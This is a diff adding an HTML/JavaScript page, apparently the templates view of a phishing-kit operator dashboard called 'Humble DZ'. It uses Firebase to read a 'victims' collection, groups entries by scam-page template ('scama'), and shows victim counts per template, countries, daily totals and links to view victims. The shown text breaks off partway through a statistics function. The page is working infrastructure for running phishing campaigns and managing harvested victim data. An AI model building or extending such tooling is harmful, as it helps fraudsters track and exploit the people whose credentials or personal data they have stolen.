@@ -1,0 +1,1305 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Humble DZ · Templates</title>
+
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&family=Poppins:wght@300;400;500;600;700;800&display=swap"
+        rel="stylesheet" />
+
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+
+    <style>
+        /* ============================================================
+           CSS VARIABLES — Premium Dark Theme
+           ============================================================ */
+        :root {
+            --color-emerald: #00E676;
+            --color-cyan: #00D9FF;
+            --color-emerald-dim: rgba(0, 230, 118, 0.12);
+            --color-cyan-dim: rgba(0, 217, 255, 0.10);
+            --color-emerald-glow: rgba(0, 230, 118, 0.20);
+            --color-cyan-glow: rgba(0, 217, 255, 0.15);
+            --glass-bg: rgba(255, 255, 255, 0.035);
+            --glass-border: rgba(255, 255, 255, 0.06);
+            --glass-shadow: 0 25px 60px rgba(0, 0, 0, 0.65);
+            --text-primary: #ffffff;
+            --text-secondary: rgba(255, 255, 255, 0.72);
+            --text-muted: rgba(255, 255, 255, 0.38);
+            --radius-card: 20px;
+            --radius-sm: 12px;
+            --radius-xs: 8px;
+            --transition-smooth: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            --font-family: 'Inter', 'Poppins', sans-serif;
+            --header-height: 68px;
+            --bottom-nav-height: 64px;
+            --danger: #ff5252;
+            --warning: #ffab40;
+        }
+
+        /* ---------- Reset & Base ---------- */
+        *,
+        *::before,
+        *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            font-size: 16px;
+            scroll-behavior: smooth;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            font-family: var(--font-family);
+            background: #080808;
+            color: var(--text-primary);
+            min-height: 100vh;
+            overflow-x: hidden;
+            background-image: radial-gradient(ellipse at 20% 50%, rgba(0, 230, 118, 0.03) 0%, transparent 60%),
+                radial-gradient(ellipse at 80% 80%, rgba(0, 217, 255, 0.02) 0%, transparent 50%);
+        }
+
+        /* ---------- Animated Background ---------- */
+        .bg-canvas {
+            position: fixed;
+            inset: 0;
+            z-index: 0;
+            background: #080808;
+            overflow: hidden;
+            pointer-events: none;
+        }
+
+        .blob {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(120px);
+            opacity: 0.25;
+            will-change: transform, opacity;
+            animation: blobFloat 24s ease-in-out infinite alternate;
+        }
+
+        .blob--1 {
+            width: 700px;
+            height: 700px;
+            top: -20%;
+            left: -15%;
+            background: radial-gradient(circle, rgba(0, 230, 118, 0.25), transparent 70%);
+            animation-duration: 28s;
+        }
+
+        .blob--2 {
+            width: 550px;
+            height: 550px;
+            bottom: -15%;
+            right: -10%;
+            background: radial-gradient(circle, rgba(0, 217, 255, 0.20), transparent 70%);
+            animation-duration: 30s;
+            animation-delay: -8s;
+        }
+
+        .blob--3 {
+            width: 400px;
+            height: 400px;
+            top: 45%;
+            left: 35%;
+            background: radial-gradient(circle, rgba(0, 230, 118, 0.08), transparent 70%);
+            animation-duration: 22s;
+            animation-delay: -14s;
+            opacity: 0.15;
+        }
+
+        @keyframes blobFloat {
+            0% {
+                transform: translate(0, 0) scale(1) rotate(0deg);
+            }
+
+            33% {
+                transform: translate(60px, -70px) scale(1.08) rotate(4deg);
+            }
+
+            66% {
+                transform: translate(-50px, 60px) scale(0.92) rotate(-3deg);
+            }
+
+            100% {
+                transform: translate(40px, -40px) scale(1.03) rotate(2deg);
+            }
+        }
+
+        /* ---------- Particle Canvas ---------- */
+        #particleCanvas {
+            position: fixed;
+            inset: 0;
+            z-index: 1;
+            pointer-events: none;
+        }
+
+        /* ============================================================
+           MAIN CONTENT
+           ============================================================ */
+        .main-content {
+            flex: 1;
+            margin: 0 auto;
+            max-width: 1400px;
+            padding: 20px 32px 32px 32px;
+            position: relative;
+            z-index: 10;
+            min-height: 100vh;
+            padding-bottom: calc(32px + var(--bottom-nav-height));
+            width: 100%;
+        }
+
+        /* ---------- Top Bar ---------- */
+        .topbar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 6px 0 18px 0;
+            border-bottom: 1px solid var(--glass-border);
+            margin-bottom: 28px;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+
+        .topbar-left {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .topbar-left .back-btn {
+            background: none;
+            border: 1px solid var(--glass-border);
+            color: var(--text-secondary);
+            padding: 8px 14px;
+            border-radius: var(--radius-xs);
+            cursor: pointer;
+            transition: all var(--transition-smooth);
+            font-family: var(--font-family);
+            font-size: 0.85rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            text-decoration: none;
+        }
+
+        .topbar-left .back-btn:hover {
+            background: rgba(255, 255, 255, 0.05);
+            color: #fff;
+        }
+
+        .topbar-left .page-title {
+            font-size: 1.5rem;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+            background: linear-gradient(135deg, var(--color-emerald), var(--color-cyan));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .topbar-left .page-subtitle {
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            font-weight: 400;
+            -webkit-text-fill-color: var(--text-muted);
+            margin-left: 4px;
+        }
+
+        .topbar-right {
+            display: flex;
+            align-items: center;
+            gap: 18px;
+        }
+
+        .topbar-right .user-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+        }
+
+        .topbar-right .user-info .avatar {
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--color-emerald-dim), var(--color-cyan-dim));
+            border: 1px solid rgba(0, 230, 118, 0.12);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.9rem;
+            color: var(--color-emerald);
+            transition: all var(--transition-smooth);
+        }
+
+        .topbar-right .user-info .user-name {
+            font-weight: 600;
+        }
+
+        .topbar-right .sign-out-btn {
+            background: none;
+            border: 1px solid var(--glass-border);
+            color: var(--text-muted);
+            padding: 6px 14px;
+            border-radius: var(--radius-xs);
+            cursor: pointer;
+            transition: all var(--transition-smooth);
+            font-family: var(--font-family);
+            font-size: 0.8rem;
+        }
+
+        .topbar-right .sign-out-btn:hover {
+            background: rgba(255, 82, 82, 0.08);
+            color: var(--danger);
+            border-color: rgba(255, 82, 82, 0.15);
+        }
+
+        /* ---------- Stats Row ---------- */
+        .stats-row {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 16px;
+            margin-bottom: 28px;
+        }
+
+        .stat-card {
+            background: var(--glass-bg);
+            backdrop-filter: blur(12px) saturate(1.2);
+            -webkit-backdrop-filter: blur(12px) saturate(1.2);
+            border: 1px solid var(--glass-border);
+            border-radius: var(--radius-sm);
+            padding: 18px 22px;
+            transition: all var(--transition-smooth);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .stat-card:hover {
+            border-color: rgba(0, 230, 118, 0.12);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.2);
+        }
+
+        .stat-card .stat-icon {
+            float: right;
+            font-size: 1.5rem;
+            color: var(--text-muted);
+            opacity: 0.25;
+        }
+
+        .stat-card .stat-label {
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            letter-spacing: 0.6px;
+            color: var(--text-muted);
+            font-weight: 600;
+        }
+
+        .stat-card .stat-value {
+            font-size: 1.7rem;
+            font-weight: 800;
+            margin-top: 4px;
+            background: linear-gradient(135deg, var(--color-emerald), var(--color-cyan));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: -0.5px;
+        }
+
+        /* ---------- Glass Card ---------- */
+        .glass-card {
+            background: var(--glass-bg);
+            backdrop-filter: blur(16px) saturate(1.3);
+            -webkit-backdrop-filter: blur(16px) saturate(1.3);
+            border: 1px solid var(--glass-border);
+            border-radius: var(--radius-card);
+            padding: 26px 28px;
+            box-shadow: var(--glass-shadow);
+            transition: border-color var(--transition-smooth), box-shadow var(--transition-smooth);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .glass-card::before {
+            content: '';
+            position: absolute;
+            inset: -1px;
+            border-radius: var(--radius-card);
+            padding: 1px;
+            background: conic-gradient(from 0deg at 50% 50%, transparent, var(--color-emerald-glow), transparent 35%, var(--color-cyan-glow), transparent 70%, transparent);
+            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            -webkit-mask-composite: xor;
+            mask-composite: exclude;
+            opacity: 0;
+            transition: opacity var(--transition-smooth);
+            pointer-events: none;
+        }
+
+        .glass-card:hover::before {
+            opacity: 0.5;
+        }
+
+        .glass-card .card-title {
+            font-size: 1rem;
+            font-weight: 700;
+            margin-bottom: 16px;
+            color: var(--text-primary);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .glass-card .card-title i {
+            color: var(--color-emerald);
+            opacity: 0.8;
+        }
+
+        /* ---------- Toolbar ---------- */
+        .toolbar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 14px;
+            flex-wrap: wrap;
+            margin-bottom: 20px;
+        }
+
+        .search-wrap {
+            position: relative;
+            display: flex;
+            align-items: center;
+            flex: 1;
+            min-width: 220px;
+            max-width: 380px;
+        }
+
+        .search-wrap i {
+            position: absolute;
+            left: 14px;
+            color: var(--text-muted);
+            font-size: 0.85rem;
+            pointer-events: none;
+        }
+
+        .search-wrap input {
+            width: 100%;
+            padding: 10px 16px 10px 40px;
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid var(--glass-border);
+            border-radius: var(--radius-xs);
+            color: #fff;
+            font-family: var(--font-family);
+            font-size: 0.85rem;
+            outline: none;
+            transition: all var(--transition-smooth);
+        }
+
+        .search-wrap input:focus {
+            border-color: var(--color-emerald);
+            box-shadow: 0 0 0 4px rgba(0, 230, 118, 0.04);
+            background: rgba(255, 255, 255, 0.06);
+        }
+
+        .search-wrap input::placeholder {
+            color: var(--text-muted);
+        }
+
+        .toolbar-right {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        .records-counter {
+            font-size: 0.78rem;
+            color: var(--text-muted);
+        }
+
+        .records-counter strong {
+            color: var(--text-secondary);
+        }
+
+        /* ---------- Buttons ---------- */
+        .btn-action {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 9px 18px;
+            border-radius: var(--radius-xs);
+            font-family: var(--font-family);
+            font-size: 0.8rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all var(--transition-smooth);
+            background: rgba(255, 255, 255, 0.04);
+            color: var(--text-secondary);
+            border: 1px solid var(--glass-border);
+            text-decoration: none;
+            white-space: nowrap;
+        }
+
+        .btn-action:hover {
+            background: rgba(255, 255, 255, 0.08);
+            color: #fff;
+            transform: translateY(-1px);
+        }
+
+        .btn-action.primary {
+            background: var(--color-emerald-dim);
+            color: var(--color-emerald);
+            border-color: rgba(0, 230, 118, 0.15);
+        }
+
+        .btn-action.primary:hover {
+            background: rgba(0, 230, 118, 0.18);
+            box-shadow: 0 0 30px rgba(0, 230, 118, 0.04);
+        }
+
+        .btn-action.danger {
+            background: rgba(255, 82, 82, 0.08);
+            color: var(--danger);
+            border-color: rgba(255, 82, 82, 0.12);
+        }
+
+        .btn-action.danger:hover {
+            background: rgba(255, 82, 82, 0.15);
+        }
+
+        .btn-action:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        /* ============================================================
+           TEMPLATE GRID
+           ============================================================ */
+        .templates-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 18px;
+        }
+
+        .template-card {
+            background: rgba(255, 255, 255, 0.025);
+            border: 1px solid var(--glass-border);
+            border-radius: var(--radius-sm);
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+            transition: all 0.35s cubic-bezier(0.34, 1.56, 0.64, 1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .template-card::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            border-radius: var(--radius-sm);
+            background: linear-gradient(135deg, rgba(0, 230, 118, 0.05), transparent 60%);
+            opacity: 0;
+            transition: opacity 0.35s ease;
+            pointer-events: none;
+        }
+
+        .template-card:hover {
+            border-color: rgba(0, 230, 118, 0.20);
+            background: rgba(255, 255, 255, 0.045);
+            transform: translateY(-4px);
+            box-shadow: 0 16px 50px rgba(0, 0, 0, 0.25);
+        }
+
+        .template-card:hover::after {
+            opacity: 1;
+        }
+
+        .template-card .tc-head {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .template-card .tc-icon {
+            width: 44px;
+            height: 44px;
+            border-radius: 12px;
+            background: linear-gradient(135deg, var(--color-emerald-dim), var(--color-cyan-dim));
+            border: 1px solid rgba(0, 230, 118, 0.12);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--color-emerald);
+            font-size: 1.05rem;
+            flex-shrink: 0;
+        }
+
+        .template-card .tc-title-wrap {
+            min-width: 0;
+            flex: 1;
+        }
+
+        .template-card .tc-name {
+            font-weight: 700;
+            font-size: 0.95rem;
+            color: var(--text-primary);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .template-card .tc-meta {
+            font-size: 0.7rem;
+            color: var(--text-muted);
+            margin-top: 2px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .template-card .tc-stats {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        .tc-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 0.7rem;
+            font-weight: 600;
+            padding: 4px 12px;
+            border-radius: 20px;
+            background: rgba(255, 255, 255, 0.04);
+            color: var(--text-secondary);
+            border: 1px solid var(--glass-border);
+        }
+
+        .tc-badge i {
+            font-size: 0.65rem;
+            opacity: 0.7;
+        }
+
+        .tc-badge.emerald {
+            background: var(--color-emerald-dim);
+            color: var(--color-emerald);
+            border-color: rgba(0, 230, 118, 0.10);
+        }
+
+        .tc-badge.cyan {
+            background: var(--color-cyan-dim);
+            color: var(--color-cyan);
+            border-color: rgba(0, 217, 255, 0.08);
+        }
+
+        .template-card .tc-actions {
+            display: flex;
+            gap: 8px;
+            margin-top: auto;
+            padding-top: 4px;
+        }
+
+        .template-card .tc-actions .btn-action {
+            flex: 1;
+            justify-content: center;
+            padding: 8px 10px;
+            font-size: 0.75rem;
+        }
+
+        /* ---------- Empty State ---------- */
+        .empty-state {
+            text-align: center;
+            padding: 50px 20px;
+            color: var(--text-muted);
+        }
+
+        .empty-state i {
+            font-size: 3.5rem;
+            margin-bottom: 16px;
+            opacity: 0.2;
+        }
+
+        .empty-state h3 {
+            font-weight: 600;
+            color: var(--text-secondary);
+        }
+
+        .empty-state p {
+            font-size: 0.85rem;
+            margin-top: 4px;
+        }
+
+        /* ---------- Skeleton ---------- */
+        .skeleton-card {
+            height: 190px;
+            border-radius: var(--radius-sm);
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--glass-border);
+            animation: pulse 1.6s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                opacity: 0.4;
+            }
+
+            50% {
+                opacity: 0.8;
+            }
+        }
+
+        /* ---------- Toast ---------- */
+        .toast-container {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            max-width: 400px;
+            width: 100%;
+            pointer-events: none;
+        }
+
+        .toast {
+            pointer-events: auto;
+            background: rgba(16, 16, 16, 0.92);
+            backdrop-filter: blur(18px) saturate(1.4);
+            -webkit-backdrop-filter: blur(18px) saturate(1.4);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 16px;
+            padding: 16px 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
+            display: flex;
+            align-items: flex-start;
+            gap: 14px;
+            transform: translateX(120%);
+            opacity: 0;
+            transition: all 0.45s cubic-bezier(0.22, 1, 0.36, 1);
+            color: #fff;
+        }
+
+        .toast.show {
+            transform: translateX(0);
+            opacity: 1;
+        }
+
+        .toast-icon {
+            flex-shrink: 0;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.9rem;
+            margin-top: 1px;
+        }
+
+        .toast--success .toast-icon {
+            background: var(--color-emerald-dim);
+            color: var(--color-emerald);
+        }
+
+        .toast--error .toast-icon {
+            background: rgba(255, 82, 82, 0.15);
+            color: var(--danger);
+        }
+
+        .toast--info .toast-icon {
+            background: var(--color-cyan-dim);
+            color: var(--color-cyan);
+        }
+
+        .toast--warning .toast-icon {
+            background: rgba(255, 171, 64, 0.15);
+            color: var(--warning);
+        }
+
+        .toast-body {
+            flex: 1;
+        }
+
+        .toast-title {
+            font-size: 0.85rem;
+            font-weight: 700;
+            margin-bottom: 2px;
+        }
+
+        .toast-message {
+            font-size: 0.8rem;
+            color: var(--text-secondary);
+            font-weight: 400;
+        }
+
+        .toast-close {
+            flex-shrink: 0;
+            background: none;
+            border: none;
+            color: var(--text-muted);
+            cursor: pointer;
+            font-size: 0.9rem;
+            padding: 4px;
+            transition: color var(--transition-smooth);
+            border-radius: 6px;
+            margin-top: -2px;
+        }
+
+        .toast-close:hover {
+            color: #fff;
+        }
+
+        /* ============================================================
+           RESPONSIVE
+           ============================================================ */
+        @media (max-width: 1024px) {
+            .main-content {
+                padding: 16px 20px 28px 20px;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .main-content {
+                padding: 12px 14px 20px 14px;
+                padding-bottom: calc(20px + var(--bottom-nav-height) + 8px);
+            }
+
+            .topbar-left .page-title {
+                font-size: 1.1rem;
+            }
+
+            .topbar-left .page-subtitle {
+                display: none;
+            }
+
+            .topbar-right .user-info .user-name {
+                display: none;
+            }
+
+            .stats-row {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 10px;
+            }
+
+            .stat-card .stat-value {
+                font-size: 1.2rem;
+            }
+
+            .glass-card {
+                padding: 16px 18px;
+            }
+
+            .search-wrap {
+                max-width: none;
+            }
+
+            .templates-grid {
+                grid-template-columns: 1fr;
+                gap: 12px;
+            }
+
+            .toast-container {
+                bottom: 80px;
+                right: 16px;
+                left: 16px;
+                max-width: none;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .stats-row {
+                grid-template-columns: 1fr 1fr;
+                gap: 8px;
+            }
+
+            .stat-card {
+                padding: 12px 14px;
+            }
+
+            .stat-card .stat-value {
+                font-size: 1rem;
+            }
+
+            .glass-card {
+                padding: 12px 14px;
+            }
+
+            .template-card {
+                padding: 16px;
+            }
+
+            .template-card .tc-actions .btn-action span {
+                display: none;
+            }
+        }
+
+        /* ---------- Reduced Motion ---------- */
+        @media (prefers-reduced-motion: reduce) {
+
+            *,
+            *::before,
+            *::after {
+                animation-duration: 0.01ms !important;
+                animation-iteration-count: 1 !important;
+                transition-duration: 0.01ms !important;
+            }
+
+            .blob {
+                animation: none !important;
+            }
+        }
+
+        /* ---------- Scrollbar ---------- */
+        ::-webkit-scrollbar {
+            width: 6px;
+            height: 6px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: transparent;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.06);
+            border-radius: 10px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: rgba(255, 255, 255, 0.10);
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- ============================================================
+    BACKGROUND
+    ============================================================ -->
+    <div class="bg-canvas" aria-hidden="true">
+        <div class="blob blob--1"></div>
+        <div class="blob blob--2"></div>
+        <div class="blob blob--3"></div>
+    </div>
+    <canvas id="particleCanvas" aria-hidden="true"></canvas>
+
+    <!-- ============================================================
+    MAIN CONTENT
+    ============================================================ -->
+    <main class="main-content" id="mainContent">
+
+        <!-- Top Bar -->
+        <header class="topbar">
+            <div class="topbar-left">
+                <a href="index.html" class="back-btn"><i class="fas fa-arrow-left"></i> Back</a>
+                <h1 class="page-title" id="pageTitle">Templates <span class="page-subtitle">· All templates</span></h1>
+            </div>
+            <div class="topbar-right">
+                <div class="user-info">
+                    <div class="avatar" aria-hidden="true"><i class="fas fa-user"></i></div>
+                    <span class="user-name" id="userNameDisplay">Admin</span>
+                </div>
+                <button class="sign-out-btn" id="signOutBtn"><i class="fas fa-sign-out-alt"></i> Logout</button>
+            </div>
+        </header>
+
+        <!-- Stats Row -->
+        <div class="stats-row" id="statsRow">
+            <div class="stat-card">
+                <span class="stat-icon"><i class="fas fa-layer-group"></i></span>
+                <div class="stat-label">Templates</div>
+                <div class="stat-value" id="totalTemplates">0</div>
+            </div>
+            <div class="stat-card">
+                <span class="stat-icon"><i class="fas fa-users"></i></span>
+                <div class="stat-label">Total Victims</div>
+                <div class="stat-value" id="totalVictims">0</div>
+            </div>
+            <div class="stat-card">
+                <span class="stat-icon"><i class="fas fa-crown"></i></span>
+                <div class="stat-label">Top Template</div>
+                <div class="stat-value" id="topTemplate" style="font-size:1.05rem;">—</div>
+            </div>
+            <div class="stat-card">
+                <span class="stat-icon"><i class="fas fa-calendar-day"></i></span>
+                <div class="stat-label">Today</div>
+                <div class="stat-value" id="todayVictims">0</div>
+            </div>
+        </div>
+
+        <!-- Templates Card -->
+        <div class="glass-card">
+            <div class="card-title"><i class="fas fa-file-code"></i> All Templates</div>
+
+            <!-- Toolbar -->
+            <div class="toolbar">
+                <div class="search-wrap">
+                    <i class="fas fa-search"></i>
+                    <input type="text" id="searchInput" placeholder="Search templates..." autocomplete="off" />
+                </div>
+                <div class="toolbar-right">
+                    <span class="records-counter">Showing <strong id="visibleCount">0</strong> of <strong
+                            id="totalCount">0</strong></span>
+                    <a href="addtemplates.html" class="btn-action primary"><i class="fas fa-plus-circle"></i> Add
+                        Template</a>
+                </div>
+            </div>
+
+            <!-- Grid -->
+            <div id="templatesContainer">
+                <div class="templates-grid" id="templatesGrid">
+                    <div class="skeleton-card"></div>
+                    <div class="skeleton-card"></div>
+                    <div class="skeleton-card"></div>
+                </div>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- ============================================================
+    TOAST CONTAINER
+    ============================================================ -->
+    <div class="toast-container" id="toastContainer" role="status" aria-live="polite"></div>
+
+    <!-- ============================================================
+    FIREBASE SDK
+    ============================================================ -->
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js">
+    </script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js">
+    </script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js">
+    </script>
+
+    <!-- Shared helpers (toast + particle background) -->
+    <script src="js/toast.js"></script>
+    <script src="js/particles.js"></script>
+
+    <script>
+        // ================================================================
+        //  1.  FIREBASE CONFIG
+        // ================================================================
+        const firebaseConfig = {
+            apiKey: "AIzaSyB3GIu78tATEum3SUUwShhuYGr-IcJF3Eo",
+            authDomain: "firstproject-44.firebaseapp.com",
+            projectId: "firstproject-44",
+            storageBucket: "firstproject-44.firebasestorage.app",
+            messagingSenderId: "324220801352",
+            appId: "1:324220801352:web:8d9ffb5dcbf119cccf637d",
+            measurementId: "G-9Q8G67HLNW"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+        const db = firebase.firestore();
+
+        // Enable offline persistence
+        db.enablePersistence({ synchronizeTabs: true }).catch(() => { });
+
+        // ================================================================
+        //  2.  AUTH CHECK
+        // ================================================================
+        auth.onAuthStateChanged((user) => {
+            if (!user) {
+                window.location.href = 'humbledzlogin.html';
+                return;
+            }
+            const name = user.displayName || user.email?.split('@')[0] || 'Admin';
+            document.getElementById('userNameDisplay').textContent = name;
+            loadTemplates();
+        });
+
+        // ================================================================
+        //  3.  DOM REFS
+        // ================================================================
+        const templatesContainer = document.getElementById('templatesContainer');
+        const searchInput = document.getElementById('searchInput');
+        const visibleCountEl = document.getElementById('visibleCount');
+        const totalCountEl = document.getElementById('totalCount');
+        const totalTemplatesEl = document.getElementById('totalTemplates');
+        const totalVictimsEl = document.getElementById('totalVictims');
+        const topTemplateEl = document.getElementById('topTemplate');
+        const todayVictimsEl = document.getElementById('todayVictims');
+        const signOutBtn = document.getElementById('signOutBtn');
+
+        // ================================================================
+        //  4.  STATE
+        // ================================================================
+        let allTemplates = [];   // [{ name, count, countries, lastSeen, today }]
+        let unsubscribe = null;
+
+        // ================================================================
+        //  5.  SIGN OUT
+        // ================================================================
+        signOutBtn.addEventListener('click', async () => {
+            try {
+                await auth.signOut();
+                showToast('Signed out successfully.', 'success', 'Goodbye');
+                window.location.href = 'humbledzlogin.html';
+            } catch (err) {
+                showToast('Error signing out.', 'error');
+            }
+        });
+
+        // ================================================================
+        //  6.  LOAD TEMPLATES (derived from the victims collection)
+        // ================================================================
+        function loadTemplates() {
+            if (unsubscribe) {
+                unsubscribe();
+                unsubscribe = null;
+            }
+
+            unsubscribe = db.collection('victims')
+                .orderBy('createdAt', 'desc')
+                .onSnapshot((snapshot) => {
+                    const grouped = {};
+
+                    snapshot.forEach((doc) => {
+                        const data = doc.data();
+                        const name = (data.scama || 'Untitled').trim() || 'Untitled';
+                        if (!grouped[name]) {
+                            grouped[name] = {
+                                name: name,
+                                count: 0,
+                                countries: new Set(),
+                                lastSeen: null,
+                                today: 0
+                            };
+                        }
+                        const t = grouped[name];
+                        t.count++;
+
+                        if (data.country && data.country !== '—') t.countries.add(data.country);
+
+                        const created = toDate(data.createdAt);
+                        if (created) {
+                            if (!t.lastSeen || created > t.lastSeen) t.lastSeen = created;
+                            if (isToday(created)) t.today++;
+                        }
+                    });
+
+                    allTemplates = Object.values(grouped)
+                        .map(t => ({
+                            name: t.name,
+                            count: t.count,
+                            countries: t.countries.size,
+                            lastSeen: t.lastSeen,
+                            today: t.today
+                        }))
+                        .sort((a, b) => b.count - a.count || a.name.localeCompare(b.name));
+
+                    updateStats(allTemplates);
+                    renderTemplates();
+                }, (error) => {
+                    console.error('Templates error:', error);
+                    showToast('Error loading templates: ' + error.message, 'error');
+                    templatesContainer.innerHTML = `
+                        <div class="empty-state">
+                            <i class="fas fa-exclamation-triangle" style="color:var(--danger);"></i>
+                            <h3>Error loading templates</h3>
+                            <p>${escHtml(error.message)}</p>
+                            <button class="btn-action primary" style="margin-top:14px;" onclick="loadTemplates()">
+                                <i class="fas fa-redo"></i> Retry
+                            </button>
+                        </div>
+                    `;
+                });
+        }
+
+        // ================================================================
+        //  7.  RENDER TEMPLATE CARDS
+        // ================================================================
+        function renderTemplates() {
+            const query = searchInput.value.trim().toLowerCase();
+            const list = query
+                ? allTemplates.filter(t => t.name.toLowerCase().includes(query))
+                : allTemplates;
+
+            visibleCountEl.textContent = list.length;
+            totalCountEl.textContent = allTemplates.length;
+
+            if (allTemplates.length === 0) {
+                templatesContainer.innerHTML = `
+                    <div class="empty-state">
+                        <i class="fas fa-file-code"></i>
+                        <h3>No templates yet</h3>
+                        <p>Templates appear here automatically once victims are collected.</p>
+                        <a href="addtemplates.html" class="btn-action primary" style="margin-top:14px;">
+                            <i class="fas fa-plus-circle"></i> Add your first template
+                        </a>
+                    </div>
+                `;
+                return;
+            }
+
+            if (list.length === 0) {
+                templatesContainer.innerHTML = `
+                    <div class="empty-state">
+                        <i class="fas fa-search"></i>
+                        <h3>No matching templates</h3>
+                        <p>Nothing matches “${escHtml(searchInput.value.trim())}”.</p>
+                    </div>
+                `;
+                return;
+            }
+
+            const cards = list.map(t => `
+                <div class="template-card">
+                    <div class="tc-head">
+                        <div class="tc-icon"><i class="fas fa-file-code"></i></div>
+                        <div class="tc-title-wrap">
+                            <div class="tc-name" title="${escHtml(t.name)}">${escHtml(t.name)}</div>
+                            <div class="tc-meta">
+                                <i class="fas fa-clock"></i>
+                                ${t.lastSeen ? 'Last activity ' + timeAgo(t.lastSeen) : 'No activity yet'}
+                            </div>
+                        </div>
+                    </div>
+                    <div class="tc-stats">
+                        <span class="tc-badge emerald"><i class="fas fa-users"></i> ${t.count} victim${t.count === 1 ? '' : 's'}</span>
+                        <span class="tc-badge cyan"><i class="fas fa-globe"></i> ${t.countries} countr${t.countries === 1 ? 'y' : 'ies'}</span>
+                        ${t.today > 0 ? `<span class="tc-badge"><i class="fas fa-bolt"></i> ${t.today} today</span>` : ''}
+                    </div>
+                    <div class="tc-actions">
+                        <a class="btn-action primary" href="victims.html?template=${encodeURIComponent(t.name)}">
+                            <i class="fas fa-eye"></i> <span>View Victims</span>
+                        </a>
+                        <button class="btn-action" data-copy="${escHtml(t.name)}" title="Copy template name">
+                            <i class="fas fa-copy"></i> <span>Copy</span>
+                        </button>
+                    </div>
+                </div>
+            `).join('');
+
+            templatesContainer.innerHTML = `<div class="templates-grid">${cards}</div>`;
+
+            templatesContainer.querySelectorAll('[data-copy]').forEach(btn => {
+                btn.addEventListener('click', () => copyText(btn.dataset.copy));
+            });
+        }
+
+        // ================================================================
+        //  8.  UPDATE STATS
+        // ================================================================
+        function updateStats(templates) {
+            const totalVictims = templates.reduce((sum, t) => sum + t.count, 0);
+            const today = templates.reduce((sum, t) => sum + t.today, 0);
